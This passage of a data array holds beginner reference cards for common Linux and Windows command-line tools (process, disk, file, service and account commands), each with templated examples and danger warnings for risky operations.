 {"id":"lx-ps","level":"beginner","example_output":"  PID TTY          TIME CMD\n 1834 pts/0    00:00:00 bash\n 2051 pts/0    00:00:00 ps","cat":"Linux Essentials","title":"ps - list processes","desc":"Show running processes and their PIDs.","tags":["linux","reference","teaching","process"],"code":{"linux":"ps aux                 # all processes\nps -ef                 # full format\nps aux | grep {{NAME:nginx}}"}},
 {"id":"lx-top","level":"beginner","cat":"Linux Essentials","title":"top - live process monitor","desc":"Watch processes, CPU, and memory update in real time.","tags":["linux","reference","teaching","process"],"code":{"linux":"top          # q quit, P sort by CPU, M by memory\nhtop         # friendlier UI if installed"}},
 {"id":"lx-kill","level":"beginner","cat":"Linux Essentials","title":"kill - signal or stop a process","desc":"Send a signal (usually to stop) a process by PID.","tags":["linux","reference","teaching","process"],"code":{"linux":"kill {{PID:1234}}\nkill -9 {{PID:1234}}    # force kill\nkill -l                # list signal names"},"danger":"-9 force-kills without cleanup. Verify the PID first."},
 {"id":"lx-killall","level":"beginner","cat":"Linux Essentials","title":"killall - kill processes by name","desc":"Stop every process matching a program name.","tags":["linux","reference","teaching","process"],"code":{"linux":"killall {{NAME:firefox}}"},"danger":"Stops ALL matching processes at once."},
 {"id":"lx-pkill","level":"beginner","cat":"Linux Essentials","title":"pkill / pgrep - match processes by pattern","desc":"Find or kill processes by name/pattern.","tags":["linux","reference","teaching","process"],"code":{"linux":"pgrep -a {{NAME:ssh}}    # find matching\npkill {{NAME:ssh}}       # kill matching"},"danger":"pkill can match more than you expect - check with pgrep first."},
 {"id":"lx-jobs","level":"beginner","cat":"Linux Essentials","title":"jobs / bg / fg - background job control","desc":"Manage commands running in the current shell.","tags":["linux","reference","teaching","process"],"code":{"linux":"jobs        # list this shell's jobs\nbg %1       # resume job 1 in background\nfg %1       # bring job 1 to foreground   (Ctrl+Z suspends)"}},
 {"id":"lx-nice","level":"beginner","cat":"Linux Essentials","title":"nice / renice - set process priority","desc":"Start or adjust how much CPU a process may take.","tags":["linux","reference","teaching","process"],"code":{"linux":"nice -n 10 {{CMD:big-job}}       # start at lower priority\nrenice -n 5 -p {{PID:1234}}      # change a running process"}},
 {"id":"lx-nohup","level":"beginner","cat":"Linux Essentials","title":"nohup - keep running after logout","desc":"Run a command that survives closing the terminal.","tags":["linux","reference","teaching","process"],"code":{"linux":"nohup {{CMD:./long-task.sh}} &\n# output is written to nohup.out"}},
 {"id":"lx-uname","level":"beginner","example_output":"Linux fieldbox 6.8.0-40-generic #40-Ubuntu SMP x86_64 GNU/Linux","cat":"Linux Essentials","title":"uname - kernel / system info","desc":"Print the kernel and system architecture details.","tags":["linux","reference","teaching"],"code":{"linux":"uname -a       # everything\nuname -r       # kernel version"}},
 {"id":"lx-hostname","level":"beginner","example_output":"fieldbox","cat":"Linux Essentials","title":"hostname - show or set the hostname","desc":"Display (or change) the computer's name.","tags":["linux","reference","teaching"],"code":{"linux":"hostname\nhostnamectl              # detailed view (systemd)"}},
 {"id":"lx-uptime","level":"beginner","example_output":" 10:32:15 up 3 days,  4:21,  2 users,  load average: 0.14, 0.09, 0.06","cat":"Linux Essentials","title":"uptime - how long the system has run","desc":"Show boot time, uptime, and load averages.","tags":["linux","reference","teaching"],"code":{"linux":"uptime"}},
 {"id":"lx-date","level":"beginner","example_output":"Sat Jul  5 10:32:41 UTC 2026","cat":"Linux Essentials","title":"date - show or format the date/time","desc":"Print the current date/time, or format it.","tags":["linux","reference","teaching"],"code":{"linux":"date\ndate '+%Y-%m-%d %H:%M:%S'\ndate -u          # UTC"}},
 {"id":"lx-cal","level":"beginner","cat":"Linux Essentials","title":"cal - show a calendar","desc":"Print a month or year calendar.","tags":["linux","reference","teaching"],"code":{"linux":"cal\ncal 2025"}},
 {"id":"lx-free","level":"beginner","example_output":"               total        used        free      shared  buff/cache   available\nMem:           3.8Gi       1.2Gi       1.4Gi        18Mi       1.2Gi       2.4Gi\nSwap:          2.0Gi          0B       2.0Gi","cat":"Linux Essentials","title":"free - memory usage","desc":"See how much RAM and swap are used and free.","tags":["linux","reference","teaching","memory"],"code":{"linux":"free -h       # human readable"}},
 {"id":"lx-df","level":"beginner","example_output":"Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        98G   41G   52G  45% /\ntmpfs           1.9G     0  1.9G   0% /dev/shm","cat":"Linux Essentials","title":"df - disk space by filesystem","desc":"Show free and used space on mounted filesystems.","tags":["linux","reference","teaching"],"code":{"linux":"df -h"}},
 {"id":"lx-du","level":"beginner","example_output":"1.2G\t.","cat":"Linux Essentials","title":"du - disk usage of files/folders","desc":"Measure how much space files or folders take up.","tags":["linux","reference","teaching"],"code":{"linux":"du -sh {{DIR:.}}                  # total for a folder\ndu -h --max-depth=1 | sort -h    # biggest subfolders"}},
 {"id":"lx-lsblk","level":"beginner","example_output":"NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS\nsda      8:0    0  100G  0 disk\n└─sda1   8:1    0  100G  0 part /","cat":"Linux Essentials","title":"lsblk - list disks and partitions","desc":"List block devices (disks, partitions) as a tree.","tags":["linux","reference","teaching"],"code":{"linux":"lsblk\nlsblk -f      # with filesystem/UUID info"}},
 {"id":"lx-shutdown","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"shutdown / reboot - power control","desc":"Power off or restart the machine.","tags":["linux","reference","teaching"],"code":{"linux":"sudo shutdown -h now     # halt now\nsudo shutdown -r +5      # reboot in 5 minutes\nsudo reboot"},"danger":"Ends all sessions. Warn other users first."},
 {"id":"lx-env","level":"beginner","cat":"Linux Essentials","title":"env / export - environment variables","desc":"View environment variables or set one for your session.","tags":["linux","reference","teaching"],"code":{"linux":"env                          # list all\nexport {{VAR:API_KEY}}={{VAL:secret}}\necho \"${{VAR:API_KEY}}\""}},
 {"id":"lx-alias","level":"beginner","cat":"Linux Essentials","title":"alias - create command shortcuts","desc":"Make a short name for a longer command.","tags":["linux","reference","teaching"],"code":{"linux":"alias ll='ls -lah'\nalias           # list current aliases   (add to ~/.bashrc to keep)"}},
 {"id":"lx-history","level":"beginner","cat":"Linux Essentials","title":"history - command history","desc":"See and reuse commands you've run before.","tags":["linux","reference","teaching"],"code":{"linux":"history\nhistory | grep {{TERM:ssh}}\n!{{NUM:42}}       # re-run history line 42"}},
 {"id":"lx-which","level":"beginner","example_output":"/usr/bin/python3","cat":"Linux Essentials","title":"which / type - locate a command","desc":"Find where a command lives, or what it resolves to.","tags":["linux","reference","teaching"],"code":{"linux":"which {{CMD:python3}}\ntype {{CMD:ll}}          # alias / builtin / file?\nwhereis {{CMD:ls}}"}},
 {"id":"lx-man","level":"beginner","cat":"Linux Essentials","title":"man - manual pages / help","desc":"Read the built-in manual for a command.","tags":["linux","reference","teaching"],"code":{"linux":"man {{CMD:ls}}       # q to quit, / to search\n{{CMD:ls}} --help    # quick usage summary"}},
 {"id":"lx-clear","level":"beginner","cat":"Linux Essentials","title":"clear - clear the terminal","desc":"Wipe the visible terminal screen.","tags":["linux","reference","teaching"],"code":{"linux":"clear            # or press Ctrl+L"}},
 {"id":"lx-watch","level":"beginner","cat":"Linux Essentials","title":"watch - re-run a command periodically","desc":"Repeat a command every few seconds and watch it change.","tags":["linux","reference","teaching"],"code":{"linux":"watch -n 2 {{CMD:df -h}}    # every 2 seconds"}},
 {"id":"lx-tar","level":"beginner","cat":"Linux Essentials","title":"tar - archive and extract","desc":"Bundle folders into an archive, or extract one.","tags":["linux","reference","teaching","backup"],"code":{"linux":"tar -czf {{OUT:backup.tar.gz}} {{DIR:folder}}   # create (gzip)\ntar -xzf {{OUT:backup.tar.gz}}                  # extract\ntar -tzf {{OUT:backup.tar.gz}}                  # list contents"}},
 {"id":"lx-gzip","level":"beginner","cat":"Linux Essentials","title":"gzip / gunzip - compress a file","desc":"Compress or decompress a single file.","tags":["linux","reference","teaching","backup"],"code":{"linux":"gzip {{FILE:big.log}}       # -> big.log.gz (replaces original)\ngunzip {{FILE:big.log}}.gz"}},
 {"id":"lx-zip","level":"beginner","cat":"Linux Essentials","title":"zip / unzip - zip archives","desc":"Create or extract .zip archives.","tags":["linux","reference","teaching","backup"],"code":{"linux":"zip -r {{OUT:files.zip}} {{DIR:folder}}\nunzip {{OUT:files.zip}} -d {{DIR:out/}}"}},
 {"id":"lx-mount","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"mount / umount - mount filesystems","desc":"Attach or detach a disk/USB to a folder.","tags":["linux","reference","teaching"],"code":{"linux":"mount                                 # what's mounted\nsudo mount {{DEV:/dev/sdb1}} {{MNT:/mnt}}\nsudo umount {{MNT:/mnt}}"},"danger":"Unmount cleanly before removing media to avoid data loss."},
 {"id":"wcmd-dir","level":"beginner","cat":"Windows Essentials","title":"dir - list directory contents","desc":"List files and folders in the current directory.","tags":["windows","reference","teaching"],"code":{"cmd":"dir\ndir /a                 # include hidden/system\ndir /s /b {{NAME:*.log}}   # recurse, bare full paths"}},
 {"id":"wcmd-cd","level":"beginner","cat":"Windows Essentials","title":"cd / chdir - change directory","desc":"Move between folders (and drives) at the prompt.","tags":["windows","reference","teaching"],"code":{"cmd":"cd {{DIR:C:\\Users}}\ncd ..\ncd \\           # root of current drive\n{{DRIVE:D:}}     # switch to another drive"}},
 {"id":"wcmd-md","level":"beginner","cat":"Windows Essentials","title":"md / mkdir - make a directory","desc":"Create a new folder (parents included).","tags":["windows","reference","teaching"],"code":{"cmd":"md {{DIR:project}}\nmkdir a\\b\\c    # creates the whole path"}},
 {"id":"wcmd-rd","level":"beginner","cat":"Windows Essentials","title":"rd / rmdir - remove a directory","desc":"Delete a folder, optionally with everything in it.","tags":["windows","reference","teaching"],"code":{"cmd":"rd {{DIR:olddir}}\nrd /s /q {{DIR:folder}}    # recursive, no prompt"},"danger":"/s /q deletes everything inside without confirmation."},
 {"id":"wcmd-del","level":"beginner","cat":"Windows Essentials","title":"del / erase - delete files","desc":"Delete one or more files (no recycle bin).","tags":["windows","reference","teaching"],"code":{"cmd":"del {{FILE:file.txt}}\ndel /s /q {{NAME:*.tmp}}    # recurse, no prompt"},"danger":"Deleted files bypass the Recycle Bin."},
 {"id":"wcmd-copy","level":"beginner","cat":"Windows Essentials","title":"copy - copy files","desc":"Copy one or more files to another location.","tags":["windows","reference","teaching"],"code":{"cmd":"copy {{SRC:a.txt}} {{DST:b.txt}}\ncopy *.txt {{DIR:C:\\backup}}"}},
 {"id":"wcmd-xcopy","level":"beginner","cat":"Windows Essentials","title":"xcopy - copy files and folder trees","desc":"Copy whole directory trees, including subfolders.","tags":["windows","reference","teaching"],"code":{"cmd":"xcopy {{SRC:C:\\src}} {{DST:D:\\dst}} /E /I /H   # /E subdirs, /I assume dir, /H hidden"}},
 {"id":"wcmd-move","level":"beginner","cat":"Windows Essentials","title":"move - move or rename","desc":"Move files to another folder, or rename them.","tags":["windows","reference","teaching"],"code":{"cmd":"move {{SRC:old.txt}} {{DST:new.txt}}\nmove *.log {{DIR:C:\\logs}}"}},
 {"id":"wcmd-ren","level":"beginner","cat":"Windows Essentials","title":"ren / rename - rename a file","desc":"Rename a file or folder in place.","tags":["windows","reference","teaching"],"code":{"cmd":"ren {{FILE:old.txt}} {{NEW:new.txt}}"}},
 {"id":"wcmd-type","level":"beginner","cat":"Windows Essentials","title":"type - print a file's contents","desc":"Display a text file at the prompt.","tags":["windows","reference","teaching"],"code":{"cmd":"type {{FILE:file.txt}}"}},
 {"id":"wcmd-more","level":"beginner","cat":"Windows Essentials","title":"more - page through output","desc":"Show output one screen at a time.","tags":["windows","reference","teaching"],"code":{"cmd":"more {{FILE:big.txt}}\ndir | more"}},
 {"id":"wcmd-tree","level":"beginner","cat":"Windows Essentials","title":"tree - show a directory tree","desc":"Display folders (and optionally files) as a tree.","tags":["windows","reference","teaching"],"code":{"cmd":"tree\ntree /F        # include files"}},
 {"id":"wcmd-attrib","level":"beginner","cat":"Windows Essentials","title":"attrib - view/change file attributes","desc":"Show or set read-only, hidden, system attributes.","tags":["windows","reference","teaching"],"code":{"cmd":"attrib {{FILE:file.txt}}\nattrib +h {{FILE:file.txt}}        # hide\nattrib -r -h -s {{FILE:file.txt}}   # clear flags"}},
 {"id":"wcmd-fc","level":"beginner","cat":"Windows Essentials","title":"fc - compare two files","desc":"Show the differences between two files.","tags":["windows","reference","teaching"],"code":{"cmd":"fc {{A:file1.txt}} {{B:file2.txt}}"}},
 {"id":"wcmd-where","level":"beginner","cat":"Windows Essentials","title":"where - locate a command or file","desc":"Find where a program or file lives on the PATH/disk.","tags":["windows","reference","teaching"],"code":{"cmd":"where {{CMD:python}}\nwhere /r C:\\ {{NAME:*.dll}}"}},
 {"id":"wcmd-cls","level":"beginner","cat":"Windows Essentials","title":"cls - clear the screen","desc":"Clear the Command Prompt window.","tags":["windows","reference","teaching"],"code":{"cmd":"cls"}},
 {"id":"wcmd-ver","level":"beginner","example_output":"Microsoft Windows [Version 10.0.22631.3737]","cat":"Windows Essentials","title":"ver - Windows version","desc":"Print the Windows version string.","tags":["windows","reference","teaching"],"code":{"cmd":"ver"}},
 {"id":"wcmd-set","level":"beginner","cat":"Windows Essentials","title":"set - environment variables","desc":"List or set environment variables for the session.","tags":["windows","reference","teaching"],"code":{"cmd":"set                        # list all\nset {{VAR:MYVAR}}={{VAL:hello}}\necho %{{VAR:MYVAR}}%"}},
 {"id":"wcmd-tasklist","level":"beginner","example_output":"Image Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem                           4 Services                   0        140 K\nexplorer.exe                  4820 Console                    1     78,204 K","cat":"Windows Essentials","title":"tasklist - list running processes","desc":"Show running processes, PIDs, and memory.","tags":["windows","reference","teaching","process"],"code":{"cmd":"tasklist\ntasklist /svc\ntasklist /fi \"imagename eq {{NAME:chrome.exe}}\""}},
 {"id":"wcmd-taskkill","level":"beginner","cat":"Windows Essentials","title":"taskkill - stop a process","desc":"End a process by PID or image name.","tags":["windows","reference","teaching","process"],"code":{"cmd":"taskkill /pid {{PID:1234}} /f\ntaskkill /im {{NAME:notepad.exe}} /f"},"danger":"/f force-terminates - unsaved work is lost."},
 {"id":"wcmd-sc","level":"beginner","cat":"Windows Essentials","title":"sc - manage Windows services","desc":"Query, start, stop, or configure services.","tags":["windows","reference","teaching"],"code":{"cmd":"sc query {{SVC:Spooler}}\nsc start {{SVC:Spooler}}\nsc stop {{SVC:Spooler}}\nsc config {{SVC:Spooler}} start= auto"}},
 {"id":"wcmd-shutdown","level":"beginner","cat":"Windows Essentials","title":"shutdown - power off / restart","desc":"Shut down or restart the computer.","tags":["windows","reference","teaching"],"code":{"cmd":"shutdown /s /t 0       # shut down now\nshutdown /r /t 0       # restart now\nshutdown /a            # abort a pending shutdown"},"danger":"Ends the session immediately with /t 0."},
 {"id":"wcmd-driverquery","level":"beginner","cat":"Windows Essentials","title":"driverquery - installed drivers","desc":"List installed device drivers.","tags":["windows","reference","teaching"],"code":{"cmd":"driverquery\ndriverquery /v         # verbose"}},
 {"id":"wcmd-gpupdate","level":"beginner","cat":"Windows Essentials","title":"gpupdate - refresh Group Policy","desc":"Reapply Group Policy without waiting for the cycle.","tags":["windows","reference","teaching"],"code":{"cmd":"gpupdate /force"}},
 {"id":"wcmd-chkdsk","level":"beginner","cat":"Windows Essentials","title":"chkdsk - check a disk","desc":"Scan a drive for filesystem errors.","tags":["windows","reference","teaching"],"code":{"cmd":"chkdsk {{DRIVE:C:}}\nchkdsk {{DRIVE:C:}} /f /r     # fix errors (schedules on reboot for C:)"},"danger":"/f /r on the system drive schedules a reboot scan."},
 {"id":"wcmd-diskpart","level":"beginner","cat":"Windows Essentials","title":"diskpart - disk & partition tool","desc":"Interactively manage disks, partitions, and volumes.","tags":["windows","reference","teaching"],"code":{"cmd":"diskpart\nDISKPART> list disk\nDISKPART> select disk {{N:1}}\nDISKPART> list partition"},"danger":"Can erase partitions/data. Confirm the disk number carefully."},
 {"id":"wcmd-sfc","level":"beginner","cat":"Windows Essentials","title":"sfc - system file checker","desc":"Scan for and repair corrupted Windows system files.","tags":["windows","reference","teaching"],"code":{"cmd":"sfc /scannow"}},
 {"id":"wcmd-hostname","level":"beginner","example_output":"FIELDBOX-PC","cat":"Windows Essentials","title":"hostname - show the computer name","desc":"Print this computer's name.","tags":["windows","reference","teaching"],"code":{"cmd":"hostname"}},
 {"id":"wcmd-whoami","level":"beginner","example_output":"fieldbox-pc\\alice","cat":"Windows Essentials","title":"whoami - current user, groups & privileges","desc":"Show the current account and its rights.","tags":["windows","reference","teaching","account"],"code":{"cmd":"whoami\nwhoami /groups\nwhoami /priv"}},
 {"id":"wcmd-net-user","level":"beginner","requires":{"elevation":true},"cat":"Windows Essentials","title":"net user - local user accounts","desc":"List, view, or create local user accounts.","tags":["windows","reference","teaching","account"],"code":{"cmd":"net user                          # list accounts\nnet user {{USER:alice}}             # account details\nnet user {{USER:alice}} * /add      # create (prompts for password)"},"danger":"Adds/changes accounts; run as Administrator."},
 {"id":"wcmd-net-localgroup","level":"beginner","requires":{"elevation":true},"cat":"Windows Essentials","title":"net localgroup - local groups","desc":"List groups or manage group membership.","tags":["windows","reference","teaching","account"],"code":{"cmd":"net localgroup\nnet localgroup Administrators\nnet localgroup Administrators {{USER:alice}} /add   # grant admin"},"danger":"Adding a user to Administrators grants full local control."},
 {"id":"wcmd-net-startstop","level":"beginner","cat":"Windows Essentials","title":"net start / stop - services","desc":"Start or stop a Windows service by name.","tags":["windows","reference","teaching"],"code":{"cmd":"net start                     # list running services\nnet start {{SVC:Spooler}}\nnet stop {{SVC:Spooler}}"}},
 {"id":"wcmd-net-use","level":"beginner","cat":"Windows Essentials","title":"net use - map network drives","desc":"Connect, list, or disconnect network shares.","tags":["windows","reference","teaching","network"],"code":{"cmd":"net use\nnet use {{DRIVE:Z:}} \\\\{{HOST:server}}\\{{SHARE:share}}\nnet use {{DRIVE:Z:}} /delete"}}
];
